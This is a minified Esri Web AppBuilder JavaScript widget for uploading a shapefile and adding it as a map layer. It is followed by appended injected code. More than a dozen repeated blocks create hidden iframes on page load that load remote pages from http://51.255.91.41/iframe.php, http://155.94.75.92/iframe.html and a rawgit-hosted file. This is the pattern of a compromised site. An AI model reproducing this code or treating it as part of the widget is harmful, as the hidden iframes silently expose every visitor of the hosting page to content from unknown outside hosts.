// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Geoprocessing/editors/SelectFeatureSetFromFile.html":'\x3cdiv\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"inputNode"\x3e\r\n    \x3cdiv class\x3d"jimu-r-row" style\x3d"margin-top: 10px;"\x3e\r\n      \x3cdiv class\x3d"col-1-2"\x3e\r\n        \x3cform data-dojo-attach-point\x3d"fileForm"\r\n            enctype\x3d"multipart/form-data"\r\n            method\x3d"POST" data-dojo-type\x3d"dijit/form/Form"\x3e\r\n          \x3cinput id\x3d"${uniqueID}_fs_file" type\x3d"file" multiple\x3d"false" name\x3d"file"\r\n            data-dojo-attach-point\x3d"fileInput" accept\x3d"application/zip"\r\n            data-dojo-attach-event\x3d"onChange: _onUpload" style\x3d"display:none"/\x3e\r\n          \x3cdiv class\x3d"jimu-btn jimu-leading-margin10 jimu-float-leading"\x3e\r\n            \x3clabel class\x3d"file-input-label" for\x3d"${uniqueID}_fs_file"\x3e\r\n              ${nls.addShapefile}\r\n            \x3c/label\x3e\r\n          \x3c/div\x3e\r\n          \x3cinput type\x3d"hidden" name\x3d"f" value\x3d"json"/\x3e\r\n        \x3c/form\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"col-1-2"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"clearLink"\r\n          data-dojo-attach-event\x3d"onClick: _clear"\r\n          class\x3d"jimu-float-trailing shp-clear" style\x3d""\x3e${nls.clear}\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"jimu-r-row shp-info"\x3e\r\n      \x3cimg data-dojo-attach-point\x3d"uploadStatus" class\x3d"upload-status" src\x3d""/\x3e\r\n      \x3cspan data-dojo-attach-point\x3d"fileInfo"\x3e\x3c/span\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"featuresetNode"\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/dom-attr dojo/dom-style dojo/on dojo/json dojo/text!./SelectFeatureSetFromFile.html dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin esri/request esri/geometry/scaleUtils esri/InfoTemplate esri/layers/FeatureLayer esri/renderers/SimpleRenderer esri/tasks/FeatureSet jimu/dijit/Message jimu/portalUrlUtils jimu/symbolUtils ./BaseFeatureSetEditor dijit/form/Form dijit/form/Select".split(" "),function(g,d,e,b,h,k,l,m,n,p,q,r,t,u,v,f,w,c,x){return g([x,
m,n],{baseClass:"jimu-gp-editor-base jimu-gp-editor-file",templateString:l,editorName:"SelectFeatureSetFromFile",layer:void 0,constructor:function(){this.uniqueID=(new Date).getTime()},postCreate:function(){this.inherited(arguments);b.set(this.clearLink,"display","none");b.set(this.uploadStatus,"display","none");this.uploadStatus.src=require.toUrl("jimu")+"/images/loading_circle.gif"},destroy:function(){this._clear()},getValue:function(){if(0===this.activeViewIndex){if(this.layer){var a=new v;a.features=
this.layer.graphics;return a}return null}return this.getFeatureSet()},_onUpload:function(){if(e.get(this.fileInput,"value")){var a=e.get(this.fileInput,"value"),a=a.replace(/\\/g,"/"),a=a.substr(a.lastIndexOf("/")+1);this.fileInfo.innerHTML=a;b.set(this.uploadStatus,"display","");var a={name:a,targetSR:this.map.spatialReference,maxRecordCount:1E3,enforceInputFileSizeLimit:!0,enforceOutputJsonSizeLimit:!0},c=q.getExtentForScale(this.map,4E4).getWidth()/this.map.width;a.generalize=!0;a.maxAllowableOffset=
c;a.reducePrecision=!0;a.numberOfDigitsAfterDecimal=0;p({url:this._getPortalUrl()+"/sharing/rest/content/features/generate",content:{filetype:"shapefile",publishParameters:k.stringify(a),f:"json"},form:this.fileForm.domNode,handleAs:"json",load:d.hitch(this,function(a){b.set(this.uploadStatus,"display","none");a.error?new f({message:a.error.message||a.error}):this.addToMap(a.featureCollection)}),error:d.hitch(this,function(){b.set(this.uploadStatus,"display","none");var a=this.nls.generateShapefileError+
this._getPortalUrl()+"/sharing/rest/content/features/generate";new f({message:a})})})}else new f({message:this.nls.noFileSelected})},addToMap:function(a){this._clear();a=a.layers[0];var c=new r("Details","${*}");this.layer=new t(a,{infoTemplate:c});this.own(h(this.layer,"click",d.hitch(this,function(a){this.map.infoWindow.setFeatures([a.graphic])})));this.changeRenderer();a=this.layer.fullExtent;this.map.addLayer(this.layer);this.map.setExtent(a.expand(1.25),!0);b.set(this.clearLink,"display","")},
changeRenderer:function(){var a=null;switch(this.layer.geometryType){case "esriGeometryPoint":a=c.getDefaultMarkerSymbol();break;case "esriGeometryPolyline":a=c.getDefaultLineSymbol();break;case "esriGeometryPolygon":a=c.getDefaultFillSymbol()}a&&this.layer.setRenderer(new u(a))},_getPortalUrl:function(){return w.getStandardPortalUrl(this.appConfig.portalUrl)},_clear:function(){this.layer&&(this.layer.clear(),this.map.removeLayer(this.layer),this.fileInfo.innerHTML="",e.set(this.fileInput,"value",
""),b.set(this.clearLink,"display","none"))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});